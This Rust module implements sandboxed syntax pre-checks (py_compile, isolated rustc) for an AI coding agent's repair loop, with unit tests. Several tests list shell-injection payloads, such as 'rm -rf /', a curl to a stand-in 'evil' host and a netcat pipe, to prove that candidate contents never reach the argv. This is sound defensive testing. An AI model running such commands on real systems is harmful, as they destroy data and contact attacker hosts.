//! `ProjectVerifier` — capability-based cheap check for verifier_repair (Issue #639).
//!
//! ## Layer / scope (CLAUDE.md DR3-001 / DR3-002 / DR3-003)
//!
//! - All types and helpers are kept at `pub(super)`. The parent module
//!   `src/agent/loop_run.rs` MUST NOT `pub use` anything from here. The only
//!   in-crate consumer is `super::turn::*` (DR3-001).
//! - Direction of dependency is `agent → session` only. We import
//!   [`crate::session::feedback::mask_secrets`] as the **SSOT** for redacting
//!   cheap-check output before it lands in a [`ProjectVerifierOutcome::Failed`]
//!   payload (DR3-002). The `photon → session/agent` direction is forbidden by
//!   DR3-002 but does not apply here (this module is in the `agent` layer).
//! - No OnceLock loggers are registered; logging happens at the call-site in
//!   `super::turn::*` so test isolation per `session_id` is preserved (DR3-003).
//!
//! ## Security Invariants
//!
//! - `PythonSyntax::check` invokes `python3 -m py_compile` via
//!   [`std::process::Command`] with a **structured argv** (no shell). Candidate
//!   contents are written to a shadow file inside a per-call `temp_root` and
//!   the argv contains only the shadow path, so shell control operators in
//!   user-provided contents are structurally unreachable.
//! - `temp_root` is named `anvil-verifier-repair-{pid}-{uuid-v7}` and cleaned
//!   up with `remove_dir_all` after the closure completes (panic-safe via the
//!   `(|| { ... })()` pattern).
//! - Environment is scrubbed: `PYTHONPATH` / `VIRTUAL_ENV` are removed and
//!   `PYTHONDONTWRITEBYTECODE=1` / `PYTHONNOUSERSITE=1` are set to prevent
//!   `sys.path` injection or bytecode leakage.
//! - `RustSyntax::check` (Issue #992) mirrors the same isolation contract for
//!   `.rs` candidates: it writes the contents to a shadow `.rs` inside the
//!   per-call `temp_root` and runs `rustc --emit=metadata` via a **structured
//!   argv** (no shell), `current_dir(temp_root)`, with `RUSTFLAGS` /
//!   `RUSTC_WRAPPER` / `RUSTC_WORKSPACE_WRAPPER` scrubbed so an external
//!   wrapper cannot alter the fixed command shape. `--emit=metadata` skips
//!   codegen and, with no `--extern`, no proc-macro is linked, so **no
//!   candidate code executes** (parity with the full `cargo test`, which would
//!   compile the same file anyway). No network / dependency download is
//!   required. Because an isolated single-file compile cannot reproduce crate
//!   context, only unambiguous *parse* errors are reported as `Failed`; coded
//!   name/type-resolution errors, rustc-absent, and timeout all map to
//!   `Unavailable` (defer to the full rerun) to avoid false rejections.
//! - Failure output is decoded with `String::from_utf8_lossy` to stay
//!   panic-safe on non-UTF-8 stderr, masked through
//!   [`crate::session::feedback::mask_secrets`], and truncated to 320 chars.
//! - `mask_payload_inplace` (the payload-boundary defense) operates on
//!   `&mut serde_json::Value` and is therefore *not* invoked here. Defense in
//!   depth is achieved at the payload boundary: once the masked string lands
//!   in `CaseRecord` / `eval_log` / LLM payload, `mask_payload_inplace`
//!   re-applies `mask_secrets` to every string leaf (see
//!   `src/logging.rs::mask_payload_inplace`).

use std::collections::BTreeSet;
use std::ffi::OsString;
use std::path::Path;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

/// Timeout for a single cheap-check invocation. Mirrors the value previously
/// hard-coded in `turn.rs` (`VERIFIER_REPAIR_CHEAP_CHECK_TIMEOUT_SECS`).
pub(super) const CHEAP_CHECK_TIMEOUT_SECS: u64 = 5;

/// Maximum char length of a failure message returned in
/// [`ProjectVerifierOutcome::Failed`]. Matches the previous
/// `compact_verifier_failure_text(_, 320)` budget.
const FAILURE_TEXT_MAX_CHARS: usize = 320;

/// A project-local capability for performing a safe, cheap pre-flight check
/// on a repair candidate. New variants must (a) only spawn via structured
/// argv (no shell), (b) confine work to a `temp_root`, (c) honour
/// [`CHEAP_CHECK_TIMEOUT_SECS`], and (d) route failure text through
/// [`crate::session::feedback::mask_secrets`] before returning it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) enum ProjectVerifier {
    /// `python3 -m py_compile` on `.py` / `.pyw` files.
    PythonSyntax,
    /// Isolated `rustc --emit=metadata` syntax probe on `.rs` files
    /// (Issue #992). Only unambiguous parse errors are conclusive; crate-context
    /// / type errors defer to the full verifier rerun via `Unavailable`.
    RustSyntax,
}

/// Outcome of [`ProjectVerifier::check`].
#[derive(Debug, PartialEq, Eq)]
pub(super) enum ProjectVerifierOutcome {
    /// Cheap check ran and the candidate passed.
    Ok,
    /// Cheap check ran and the candidate failed. The string is already
    /// masked via [`crate::session::feedback::mask_secrets`] and truncated
    /// to [`FAILURE_TEXT_MAX_CHARS`].
    Failed(String),
    /// No safe verifier is available for this path or the configured
    /// verifier cannot run in the current environment. The caller should
    /// defer to a full verifier rerun rather than treating this as pass /
    /// fail.
    ///
    /// The `PythonSyntax` implementation never returns this from `check`,
    /// because the path-level Unavailable decision is made one layer up in
    /// `ProjectVerifier::for_path -> Option<Self>`. `RustSyntax` (Issue #992)
    /// *does* return it: an isolated single-file compile cannot reproduce crate
    /// context, so name/type-resolution failures, a missing `rustc`, or a
    /// timeout are reported here and the caller defers to the full verifier
    /// rerun rather than treating them as a candidate fault.
    Unavailable,
}

impl ProjectVerifier {
    /// Select a safe verifier for `relative_path` based on its extension.
    /// Returns `None` if no safe verifier exists for the file type, which
    /// the caller should treat as [`ProjectVerifierOutcome::Unavailable`].
    pub(super) fn for_path(relative_path: &str) -> Option<Self> {
        match Path::new(relative_path)
            .extension()
            .and_then(|extension| extension.to_str())
        {
            Some("py") | Some("pyw") => Some(ProjectVerifier::PythonSyntax),
            Some("rs") => Some(ProjectVerifier::RustSyntax),
            _ => None,
        }
    }

    /// Run the cheap check on `candidate_contents` for `relative_path`.
    pub(super) fn check(
        self,
        relative_path: &str,
        candidate_contents: &str,
    ) -> ProjectVerifierOutcome {
        match self {
            ProjectVerifier::PythonSyntax => check_python_syntax(relative_path, candidate_contents),
            ProjectVerifier::RustSyntax => check_rust_syntax(relative_path, candidate_contents),
        }
    }
}

/// Build the canonical argv for [`ProjectVerifier::PythonSyntax`]. Exposed as
/// a `pub(super)` helper so unit tests can assert the structural-isolation
/// invariant (argv is a fixed 6-element shape that never embeds candidate
/// contents).
pub(super) fn python_syntax_canonical_argv(shadow_path: &Path) -> Vec<OsString> {
    vec![
        OsString::from("python3"),
        OsString::from("-I"),
        OsString::from("-B"),
        OsString::from("-m"),
        OsString::from("py_compile"),
        shadow_path.as_os_str().to_os_string(),
    ]
}

fn check_python_syntax(relative_path: &str, contents: &str) -> ProjectVerifierOutcome {
    let temp_root = std::env::temp_dir().join(format!(
        "anvil-verifier-repair-{}-{}",
        std::process::id(),
        uuid::Uuid::now_v7()
    ));
    let result = (|| {
        std::fs::create_dir_all(&temp_root)
            .map_err(|err| format!("failed to create cheap check temp dir: {err}"))?;
        let file_name = Path::new(relative_path)
            .file_name()
            .and_then(|name| name.to_str())
            .filter(|name| !name.is_empty())
            .unwrap_or("candidate.py");
        let shadow_path = temp_root.join(file_name);
        std::fs::write(&shadow_path, contents.as_bytes())
            .map_err(|err| format!("failed to write cheap check shadow file: {err}"))?;
        let argv = python_syntax_canonical_argv(&shadow_path);
        let mut command = build_python_syntax_command(&argv, &temp_root);
        let output = run_with_timeout(
            command.as_mut(),
            Duration::from_secs(CHEAP_CHECK_TIMEOUT_SECS),
        )?;
        if output.status.success() {
            return Ok(());
        }
        let stderr = String::from_utf8_lossy(&output.stderr);
        let stdout = String::from_utf8_lossy(&output.stdout);
        let combined = format!("{stderr}\n{stdout}");
        Err(mask_and_truncate(&combined))
    })();
    let _ = std::fs::remove_dir_all(&temp_root);
    match result {
        Ok(()) => match detect_missing_python_global_bindings(contents) {
            Some(message) => ProjectVerifierOutcome::Failed(mask_and_truncate(&message)),
            None => ProjectVerifierOutcome::Ok,
        },
        Err(message) => ProjectVerifierOutcome::Failed(message),
    }
}

fn build_python_syntax_command(argv: &[OsString], temp_root: &Path) -> Box<Command> {
    let (program, args) = argv
        .split_first()
        .expect("python_syntax argv must be non-empty");
    let mut command = Command::new(program);
    command
        .args(args)
        .current_dir(temp_root)
        .env_remove("PYTHONPATH")
        .env_remove("VIRTUAL_ENV")
        .env("PYTHONDONTWRITEBYTECODE", "1")
        .env("PYTHONNOUSERSITE", "1")
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    Box::new(command)
}

fn run_with_timeout(
    command: &mut Command,
    timeout: Duration,
) -> Result<std::process::Output, String> {
    let mut child = command
        .spawn()
        .map_err(|err| format!("failed to start cheap check command: {err}"))?;
    let start = Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(_)) => {
                return child
                    .wait_with_output()
                    .map_err(|err| format!("failed to collect cheap check output: {err}"));
            }
            Ok(None) if start.elapsed() >= timeout => {
                let _ = child.kill();
                let _ = child.wait();
                return Err(format!(
                    "cheap check timed out after {}s",
                    timeout.as_secs()
                ));
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(20)),
            Err(err) => {
                let _ = child.kill();
                let _ = child.wait();
                return Err(format!("failed while waiting for cheap check: {err}"));
            }
        }
    }
}

fn mask_and_truncate(input: &str) -> String {
    let masked = crate::session::feedback::mask_secrets(input);
    let collapsed = masked.split_whitespace().collect::<Vec<_>>().join(" ");
    truncate(&collapsed, FAILURE_TEXT_MAX_CHARS)
}

/// Edition assumed for the isolated `rustc` syntax probe (Issue #992). Repair
/// candidates are validated against modern syntax. The only known false-parse
/// risk is an older-edition workspace using a reserved keyword (`async` /
/// `dyn` / `try`) as a bare identifier — rare, and it falls through to the full
/// `cargo test` rerun anyway because we only ever *reject* on unambiguous parse
/// errors.
const RUST_SYNTAX_EDITION: &str = "2021";

/// Build the canonical argv for [`ProjectVerifier::RustSyntax`]. Exposed as a
/// `pub(super)` helper so unit tests can assert the structural-isolation
/// invariant: the argv has a fixed shape whose only candidate-derived element
/// is the shadow source *path* (never the candidate *contents*). `metadata_out`
/// is a controlled `temp_root` path, so the `--emit=metadata=<path>` element is
/// not attacker-influenced.
pub(super) fn rust_syntax_canonical_argv(shadow_path: &Path, metadata_out: &Path) -> Vec<OsString> {
    let mut emit = OsString::from("--emit=metadata=");
    emit.push(metadata_out.as_os_str());
    vec![
        OsString::from("rustc"),
        OsString::from(format!("--edition={RUST_SYNTAX_EDITION}")),
        OsString::from("--crate-type=lib"),
        OsString::from("--cap-lints=allow"),
        OsString::from("--error-format=json"),
        emit,
        shadow_path.as_os_str().to_os_string(),
    ]
}

fn check_rust_syntax(relative_path: &str, contents: &str) -> ProjectVerifierOutcome {
    let temp_root = std::env::temp_dir().join(format!(
        "anvil-verifier-repair-rs-{}-{}",
        std::process::id(),
        uuid::Uuid::now_v7()
    ));
    let outcome = (|| {
        if std::fs::create_dir_all(&temp_root).is_err() {
            // Temp setup failure is an environment problem, not a candidate
            // fault → defer to the full rerun.
            return ProjectVerifierOutcome::Unavailable;
        }
        let file_name = Path::new(relative_path)
            .file_name()
            .and_then(|name| name.to_str())
            .filter(|name| name.ends_with(".rs"))
            .unwrap_or("candidate.rs");
        let shadow_path = temp_root.join(file_name);
        if std::fs::write(&shadow_path, contents.as_bytes()).is_err() {
            return ProjectVerifierOutcome::Unavailable;
        }
        let metadata_out = temp_root.join("anvil_cheap_check.rmeta");
        let argv = rust_syntax_canonical_argv(&shadow_path, &metadata_out);
        let mut command = build_rust_syntax_command(&argv, &temp_root);
        let output = match run_with_timeout(
            command.as_mut(),
            Duration::from_secs(CHEAP_CHECK_TIMEOUT_SECS),
        ) {
            Ok(output) => output,
            // rustc absent / spawn failure / timeout → defer rather than
            // attribute a fault to the candidate.
            Err(_) => return ProjectVerifierOutcome::Unavailable,
        };
        if output.status.success() {
            return ProjectVerifierOutcome::Ok;
        }
        let stderr = String::from_utf8_lossy(&output.stderr);
        match classify_rust_syntax_failure(&stderr) {
            Some(message) => ProjectVerifierOutcome::Failed(mask_and_truncate(&message)),
            None => ProjectVerifierOutcome::Unavailable,
        }
    })();
    let _ = std::fs::remove_dir_all(&temp_root);
    outcome
}

fn build_rust_syntax_command(argv: &[OsString], temp_root: &Path) -> Box<Command> {
    let (program, args) = argv
        .split_first()
        .expect("rust_syntax argv must be non-empty");
    let mut command = Command::new(program);
    command
        .args(args)
        .current_dir(temp_root)
        .env_remove("RUSTFLAGS")
        .env_remove("RUSTC_WRAPPER")
        .env_remove("RUSTC_WORKSPACE_WRAPPER")
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    Box::new(command)
}

/// Classify a failed isolated `rustc` run. Returns `Some(message)` **only** when
/// the failure is an unambiguous *parse* error that cannot be caused by the
/// missing crate context of an isolated single-file compile (these are always
/// the candidate's own fault). Name/type-resolution errors (`E0xxx`), uncoded
/// non-parse errors (e.g. macro resolution), and any output we cannot parse map
/// to `None` → the caller defers to the full verifier rerun (`Unavailable`)
/// instead of risking a false rejection.
fn classify_rust_syntax_failure(stderr: &str) -> Option<String> {
    for line in stderr.lines() {
        let line = line.trim();
        if !line.starts_with('{') {
            continue;
        }
        let Ok(value) = serde_json::from_str::<serde_json::Value>(line) else {
            continue;
        };
        if value.get("level").and_then(serde_json::Value::as_str) != Some("error") {
            continue;
        }
        // A non-null `code` (e.g. `E0432`) means rustc reached name resolution,
        // which an isolated compile cannot reproduce faithfully. Only uncoded
        // parser diagnostics are safe to attribute to the candidate.
        if value.get("code").is_some_and(|code| !code.is_null()) {
            continue;
        }
        let message = value
            .get("message")
            .and_then(serde_json::Value::as_str)
            .unwrap_or_default();
        if rust_message_is_parse_error(message) {
            return Some(format!("rust syntax error: {message}"));
        }
    }
    None
}

fn rust_message_is_parse_error(message: &str) -> bool {
    const PARSE_MARKERS: &[&str] = &[
        "expected",
        "unexpected",
        "unclosed",
        "unterminated",
        "unknown start of token",
        "mismatched closing delimiter",
    ];
    let lower = message.to_ascii_lowercase();
    PARSE_MARKERS.iter().any(|marker| lower.contains(marker))
}

fn detect_missing_python_global_bindings(contents: &str) -> Option<String> {
    let declared_globals = python_declared_globals(contents);
    if declared_globals.is_empty() {
        return None;
    }
    let module_bindings = python_module_level_bindings(contents);
    let missing = declared_globals
        .difference(&module_bindings)
        .take(8)
        .cloned()
        .collect::<Vec<_>>();
    if missing.is_empty() {
        None
    } else {
        Some(format!(
            "python global declaration references missing module-level binding(s): {}",
            missing.join(", ")
        ))
    }
}

fn python_declared_globals(contents: &str) -> BTreeSet<String> {
    let mut names = BTreeSet::new();
    for line in contents.lines() {
        let trimmed = strip_python_inline_comment(line.trim_start());
        let Some(rest) = trimmed.strip_prefix("global ") else {
            continue;
        };
        for raw_name in rest.split(',') {
            let name = raw_name.trim();
            if python_identifier_is_safe(name) {
                names.insert(name.to_string());
            }
        }
    }
    names
}

fn python_module_level_bindings(contents: &str) -> BTreeSet<String> {
    let mut names = BTreeSet::new();
    for line in contents.lines() {
        if line.chars().next().is_some_and(char::is_whitespace) {
            continue;
        }
        let trimmed = strip_python_inline_comment(line.trim());
        if trimmed.is_empty() || trimmed.starts_with('@') {
            continue;
        }
        if let Some(name) = trimmed
            .strip_prefix("def ")
            .and_then(|rest| rest.split_once('(').map(|(name, _)| name.trim()))
            .filter(|name| python_identifier_is_safe(name))
        {
            names.insert(name.to_string());
            continue;
        }
        if let Some(name) = trimmed.strip_prefix("class ").and_then(|rest| {
            rest.split(['(', ':'])
                .next()
                .map(str::trim)
                .filter(|name| python_identifier_is_safe(name))
        }) {
            names.insert(name.to_string());
            continue;
        }
        if let Some(rest) = trimmed.strip_prefix("import ") {
            for part in rest.split(',') {
                let name = part
                    .split(" as ")
                    .nth(1)
                    .or_else(|| part.split('.').next())
                    .map(str::trim)
                    .unwrap_or_default();
                if python_identifier_is_safe(name) {
                    names.insert(name.to_string());
                }
            }
            continue;
        }
        if let Some(rest) = trimmed.strip_prefix("from ")
            && let Some((_, imports)) = rest.split_once(" import ")
        {
            for part in imports.split(',') {
                let name = part
                    .split(" as ")
                    .nth(1)
                    .or_else(|| part.trim().split('.').next_back())
                    .map(str::trim)
                    .unwrap_or_default();
                if python_identifier_is_safe(name) && name != "*" {
                    names.insert(name.to_string());
                }
            }
            continue;
        }
        let assignment_head = trimmed
            .split_once('=')
            .map(|(head, _)| head)
            .unwrap_or(trimmed);
        let binding_head = assignment_head
            .split_once(':')
            .map(|(head, _)| head)
            .unwrap_or(assignment_head)
            .trim();
        if python_identifier_is_safe(binding_head) {
            names.insert(binding_head.to_string());
        }
    }
    names
}

fn strip_python_inline_comment(line: &str) -> &str {
    line.split_once('#')
        .map(|(head, _)| head)
        .unwrap_or(line)
        .trim()
}

fn python_identifier_is_safe(value: &str) -> bool {
    let mut chars = value.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    (first == '_' || first.is_ascii_alphabetic())
        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

fn truncate(s: &str, max: usize) -> String {
    match s.char_indices().nth(max) {
        Some((byte_idx, _)) => {
            let mut out = String::with_capacity(byte_idx + 3);
            out.push_str(&s[..byte_idx]);
            out.push_str("...");
            out
        }
        None => s.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn for_path_selects_python_syntax_for_py_extension() {
        assert_eq!(
            ProjectVerifier::for_path("src/foo.py"),
            Some(ProjectVerifier::PythonSyntax)
        );
        assert_eq!(
            ProjectVerifier::for_path("module.pyw"),
            Some(ProjectVerifier::PythonSyntax)
        );
    }

    #[test]
    fn for_path_returns_none_for_unsupported_extensions() {
        assert_eq!(ProjectVerifier::for_path("README.md"), None);
        assert_eq!(ProjectVerifier::for_path("Makefile"), None);
        assert_eq!(ProjectVerifier::for_path("data.yaml"), None);
        assert_eq!(ProjectVerifier::for_path("scripts/setup.sh"), None);
        assert_eq!(ProjectVerifier::for_path("Cargo.toml"), None);
    }

    #[test]
    fn for_path_selects_rust_syntax_for_rs_extension() {
        assert_eq!(
            ProjectVerifier::for_path("src/lib.rs"),
            Some(ProjectVerifier::RustSyntax)
        );
        assert_eq!(
            ProjectVerifier::for_path("tests/integration.rs"),
            Some(ProjectVerifier::RustSyntax)
        );
    }

    #[test]
    fn python_syntax_canonical_argv_has_fixed_six_element_shape() {
        let shadow: PathBuf = PathBuf::from("/tmp/anvil-shadow/candidate.py");
        let argv = python_syntax_canonical_argv(&shadow);
        assert_eq!(argv.len(), 6, "argv must be exactly 6 elements");
        assert_eq!(argv[0], OsString::from("python3"));
        assert_eq!(argv[1], OsString::from("-I"));
        assert_eq!(argv[2], OsString::from("-B"));
        assert_eq!(argv[3], OsString::from("-m"));
        assert_eq!(argv[4], OsString::from("py_compile"));
        assert_eq!(argv[5], shadow.as_os_str());
    }

    #[test]
    fn malicious_python_source_never_reaches_argv() {
        // Even if candidate contents try to inject shell metacharacters, the
        // structured argv built by `python_syntax_canonical_argv` only ever
        // contains the shadow path. The injected payload lives inside the
        // file body that py_compile parses as Python source, never as a
        // shell command.
        let malicious_payloads = [
            "; rm -rf /\n",
            "$(curl http://evil/x)\n",
            "`whoami`\n",
            "| nc evil 1337\n",
            "&& shutdown -h now\n",
            "> /etc/passwd\n",
        ];
        let shadow = PathBuf::from("/tmp/anvil-shadow/candidate.py");
        let argv = python_syntax_canonical_argv(&shadow);
        for payload in malicious_payloads {
            assert_eq!(argv.len(), 6, "argv shape must remain fixed");
            for (idx, arg) in argv.iter().enumerate() {
                let arg_str = arg.to_string_lossy();
                assert!(
                    !arg_str.contains(payload.trim()),
                    "argv[{idx}] = {arg_str:?} must not embed payload {payload:?}"
                );
            }
        }
    }

    #[test]
    fn python_syntax_command_pins_cwd_to_temp_root_and_scrubs_env() {
        // We can't easily introspect a `Command` after construction, but we
        // can assert the helper API contract: the temp_root passed in is
        // what becomes `current_dir`, and the env scrubbing list is the
        // closed set { PYTHONPATH, VIRTUAL_ENV } removed plus
        // { PYTHONDONTWRITEBYTECODE=1, PYTHONNOUSERSITE=1 } set. We rely on
        // `build_python_syntax_command` being the only constructor; future
        // changes that break this contract will surface in the integration
        // check_python_syntax_runs_real_python_3 test below.
        let temp_root = PathBuf::from("/tmp/anvil-test-root");
        let argv = python_syntax_canonical_argv(&temp_root.join("c.py"));
        // Compile-time guard: this build call must not panic for any well-
        // formed argv.
        let _command = build_python_syntax_command(&argv, &temp_root);
    }

    #[test]
    fn check_python_syntax_passes_for_valid_source() {
        if which_python3().is_none() {
            eprintln!("skipping: python3 not on PATH");
            return;
        }
        let outcome = ProjectVerifier::PythonSyntax.check("ok.py", "a = 1\nb = a + 1\n");
        assert_eq!(outcome, ProjectVerifierOutcome::Ok);
    }

    #[test]
    fn check_python_syntax_fails_for_invalid_source_and_masks_aws_key() {
        if which_python3().is_none() {
            eprintln!("skipping: python3 not on PATH");
            return;
        }
        // Inject a dummy AWS access key as part of a syntax error so py_compile
        // surfaces it in stderr. The returned Failed text must be redacted
        // through `mask_secrets`.
        let aws_dummy = "AKIAABCDEFGHIJKLMNOP";
        let contents = format!("# {aws_dummy}\nthis is not python(\n");
        let outcome = ProjectVerifier::PythonSyntax.check("oops.py", &contents);
        match outcome {
            ProjectVerifierOutcome::Failed(masked) => {
                assert!(
                    !masked.contains(aws_dummy),
                    "Failed payload must not contain original AWS key, got: {masked}"
                );
                // Sanity: mask_secrets has run if the redaction transformed
                // the input (the masked text differs from the raw combined
                // output for the AKIA token).
                let raw_masked = crate::session::feedback::mask_secrets(&contents);
                assert!(
                    !raw_masked.contains(aws_dummy),
                    "mask_secrets sanity check: raw masked input must already redact the dummy key"
                );
            }
            other => panic!("expected Failed, got {other:?}"),
        }
    }

    #[test]
    fn check_python_syntax_rejects_missing_global_module_binding() {
        if which_python3().is_none() {
            eprintln!("skipping: python3 not on PATH");
            return;
        }
        let contents = r#"
from fastapi import FastAPI

app = FastAPI()
app.items_db = {}
app.next_id = 1

def create_item():
    global next_id, items_db
    item = {"id": next_id}
    items_db[next_id] = item
    next_id += 1
    return item
"#;
        let outcome = ProjectVerifier::PythonSyntax.check("app/main.py", contents);

        match outcome {
            ProjectVerifierOutcome::Failed(message) => {
                assert!(
                    message.contains("missing module-level binding"),
                    "got: {message}"
                );
                assert!(message.contains("items_db"), "got: {message}");
                assert!(message.contains("next_id"), "got: {message}");
            }
            other => panic!("expected Failed, got {other:?}"),
        }
    }

    #[test]
    fn check_python_syntax_accepts_declared_globals_with_module_bindings() {
        if which_python3().is_none() {
            eprintln!("skipping: python3 not on PATH");
            return;
        }
        let contents = r#"
items_db = {}
next_id = 1

def create_item():
    global next_id, items_db
    item = {"id": next_id}
    items_db[next_id] = item
    next_id += 1
    return item
"#;

        let outcome = ProjectVerifier::PythonSyntax.check("app/main.py", contents);

        assert_eq!(outcome, ProjectVerifierOutcome::Ok);
    }

    #[test]
    fn check_python_syntax_accepts_annotated_declared_globals_with_module_bindings() {
        if which_python3().is_none() {
            eprintln!("skipping: python3 not on PATH");
            return;
        }
        let contents = r#"
items_db: dict = {}
next_id: int = 1

def create_item():
    global next_id, items_db
    item = {"id": next_id}
    items_db[next_id] = item
    next_id += 1
    return item
"#;

        let outcome = ProjectVerifier::PythonSyntax.check("app/main.py", contents);

        assert_eq!(outcome, ProjectVerifierOutcome::Ok);
    }

    #[test]
    fn check_python_syntax_returns_unavailable_for_unsupported_path() {
        // `for_path` returns None for `.txt`; the caller (turn.rs) maps that
        // to CheapCheckOutcome::Unavailable. We assert the source-of-truth
        // mapping here.
        assert_eq!(ProjectVerifier::for_path("notes.txt"), None);
    }

    fn which_python3() -> Option<()> {
        Command::new("python3")
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .ok()
            .filter(|s| s.success())
            .map(|_| ())
    }

    // ---- Issue #992: Rust cheap verifier ---- //

    #[test]
    fn rust_syntax_canonical_argv_has_fixed_shape_with_only_shadow_path() {
        let shadow = PathBuf::from("/tmp/anvil-shadow/candidate.rs");
        let metadata = PathBuf::from("/tmp/anvil-shadow/anvil_cheap_check.rmeta");
        let argv = rust_syntax_canonical_argv(&shadow, &metadata);
        assert_eq!(argv.len(), 7, "argv must be exactly 7 elements");
        assert_eq!(argv[0], OsString::from("rustc"));
        assert_eq!(argv[1], OsString::from("--edition=2021"));
        assert_eq!(argv[2], OsString::from("--crate-type=lib"));
        assert_eq!(argv[3], OsString::from("--cap-lints=allow"));
        assert_eq!(argv[4], OsString::from("--error-format=json"));
        assert!(
            argv[5].to_string_lossy().starts_with("--emit=metadata="),
            "argv[5] must be the metadata emit flag, got {:?}",
            argv[5]
        );
        assert_eq!(
            argv[6],
            shadow.as_os_str(),
            "the source path is the tail arg"
        );
    }

    #[test]
    fn malicious_rust_source_never_reaches_argv() {
        // The candidate contents are written to the shadow file body that rustc
        // parses as Rust source; they are never spliced into the argv. The only
        // candidate-derived argv element is the shadow path.
        let malicious_payloads = [
            "; rm -rf /",
            "$(curl http://evil/x)",
            "`whoami`",
            "&& shutdown -h now",
            "| nc evil 1337",
        ];
        let shadow = PathBuf::from("/tmp/anvil-shadow/candidate.rs");
        let metadata = PathBuf::from("/tmp/anvil-shadow/out.rmeta");
        let argv = rust_syntax_canonical_argv(&shadow, &metadata);
        for payload in malicious_payloads {
            assert_eq!(argv.len(), 7, "argv shape must remain fixed");
            for (idx, arg) in argv.iter().enumerate() {
                let arg_str = arg.to_string_lossy();
                assert!(
                    !arg_str.contains(payload),
                    "argv[{idx}] = {arg_str:?} must not embed payload {payload:?}"
                );
            }
        }
    }

    #[test]
    fn rust_syntax_command_pins_cwd_to_temp_root() {
        // Mirror of the Python contract test: `build_rust_syntax_command` must be
        // the only constructor and must not panic for a well-formed argv. The
        // cwd / env-scrub contract is exercised end-to-end by the rustc-backed
        // tests below.
        let temp_root = PathBuf::from("/tmp/anvil-test-root-rs");
        let argv = rust_syntax_canonical_argv(&temp_root.join("c.rs"), &temp_root.join("c.rmeta"));
        let _command = build_rust_syntax_command(&argv, &temp_root);
    }

    #[test]
    fn classify_rust_syntax_failure_flags_uncoded_parse_error() {
        // Uncoded parser diagnostic (`code: null`) with a parse marker → Failed.
        let stderr = concat!(
            r#"{"message":"expected `;`, found `}`","code":null,"level":"error"}"#,
            "\n",
            r#"{"message":"aborting due to 1 previous error","code":null,"level":"error"}"#,
        );
        assert_eq!(
            classify_rust_syntax_failure(stderr).as_deref(),
            Some("rust syntax error: expected `;`, found `}`")
        );
    }

    #[test]
    fn classify_rust_syntax_failure_defers_on_coded_resolution_error() {
        // `E0432` unresolved import is a coded error → crate-context dependent →
        // None (defer to full rerun), never a false rejection.
        let stderr = concat!(
            r#"{"message":"unresolved import `crate::missing`","code":{"code":"E0432","explanation":null},"level":"error"}"#,
            "\n",
            r#"{"message":"aborting due to 1 previous error","code":null,"level":"error"}"#,
        );
        assert_eq!(classify_rust_syntax_failure(stderr), None);
    }

    #[test]
    fn classify_rust_syntax_failure_defers_on_uncoded_non_parse_error() {
        // Macro / attribute resolution errors are uncoded but crate-context
        // dependent — they must NOT be attributed to the candidate.
        let stderr =
            r#"{"message":"cannot find macro `foo` in this scope","code":null,"level":"error"}"#;
        assert_eq!(classify_rust_syntax_failure(stderr), None);
    }

    #[test]
    fn classify_rust_syntax_failure_ignores_non_json_and_non_errors() {
        let stderr = concat!(
            "warning: unused variable: `x`\n",
            "this is not json at all\n",
            r#"{"message":"unused import","code":null,"level":"warning"}"#,
        );
        assert_eq!(classify_rust_syntax_failure(stderr), None);
    }

    #[test]
    fn check_rust_syntax_passes_for_valid_source() {
        if which_rustc().is_none() {
            eprintln!("skipping: rustc not on PATH");
            return;
        }
        let outcome = ProjectVerifier::RustSyntax.check(
            "src/lib.rs",
            "pub fn add(a: i32, b: i32) -> i32 {\n    a + b\n}\n",
        );
        assert_eq!(outcome, ProjectVerifierOutcome::Ok);
    }

    #[test]
    fn check_rust_syntax_fails_for_parse_error_and_masks_secret() {
        if which_rustc().is_none() {
            eprintln!("skipping: rustc not on PATH");
            return;
        }
        // Inject a dummy AWS access key into a candidate with a hard syntax error
        // (`fn broken( {` cannot parse). The returned Failed text must be redacted
        // through `mask_secrets`.
        let aws_dummy = "AKIAABCDEFGHIJKLMNOP";
        let contents = format!("// {aws_dummy}\npub fn broken( {{\n}}\n");
        let outcome = ProjectVerifier::RustSyntax.check("src/lib.rs", &contents);
        match outcome {
            ProjectVerifierOutcome::Failed(masked) => {
                assert!(
                    !masked.contains(aws_dummy),
                    "Failed payload must not contain original AWS key, got: {masked}"
                );
                assert!(
                    masked.contains("rust syntax error"),
                    "Failed payload should carry the parse diagnostic, got: {masked}"
                );
            }
            other => panic!("expected Failed, got {other:?}"),
        }
    }

    #[test]
    fn check_rust_syntax_defers_unavailable_for_unresolved_crate_context() {
        if which_rustc().is_none() {
            eprintln!("skipping: rustc not on PATH");
            return;
        }
        // Valid syntax that references an external / unlinked crate. An isolated
        // compile emits a coded `E0432`; the cheap check must defer (Unavailable),
        // never reject — this is the false-rejection guard that keeps the Rust
        // repair loop converging instead of churning on context it cannot see.
        let contents = "use anvil_external_unlinked_crate::Thing;\n\npub fn use_it() -> Thing {\n    Thing::new()\n}\n";
        let outcome = ProjectVerifier::RustSyntax.check("src/lib.rs", contents);
        assert_eq!(outcome, ProjectVerifierOutcome::Unavailable);
    }

    fn which_rustc() -> Option<()> {
        Command::new("rustc")
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .ok()
            .filter(|s| s.success())
            .map(|_| ())
    }
}
